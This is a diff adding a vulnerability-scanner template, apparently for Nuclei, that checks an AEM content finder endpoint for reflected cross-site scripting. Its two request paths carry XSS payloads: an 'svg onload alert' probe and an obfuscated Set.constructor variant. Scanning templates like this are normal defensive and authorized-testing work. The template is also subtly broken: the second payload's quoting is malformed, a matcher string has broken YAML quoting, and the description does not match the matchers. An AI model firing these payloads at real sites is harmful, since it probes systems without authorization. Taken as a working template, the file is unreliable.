@@ -1,0 +1,30 @@
+id: custom-contentfinder-suggestions-check-xss
+
+info:
+  name: Content Finder Suggestions Check XSS
+  author: x86rd
+  severity: info
+  description: Checks for the presence of "xss" in the response of a content finder connector query.
+  tags: cms,contentfinder
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/bin/wcm/contentfinder/connector/suggestions.json/a.html?query_term=path%3a/&pre=%3Csvg+onload%3dalert(document.domain)%3E&post=yyyy"
+      - "{{BaseURL}}/.1.x.%3Csvg%20onload%3dSet.constructor('aler'+rt(document.domain)')()%20...json?debug=layout"
+    headers:
+      User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+      Accept-Language: en-US, en; q=0.5
+      Accept-Encoding: gzip, deflate
+      DNT: "1"
+      Connection: close
+      Upgrade-Insecure-Requests: "1"
+
+    matchers:
+      - type: word
+        words:
+          - '"suggestions":'
+          - 'selector value \'domain)'()'
+        part: body
+        condition: and
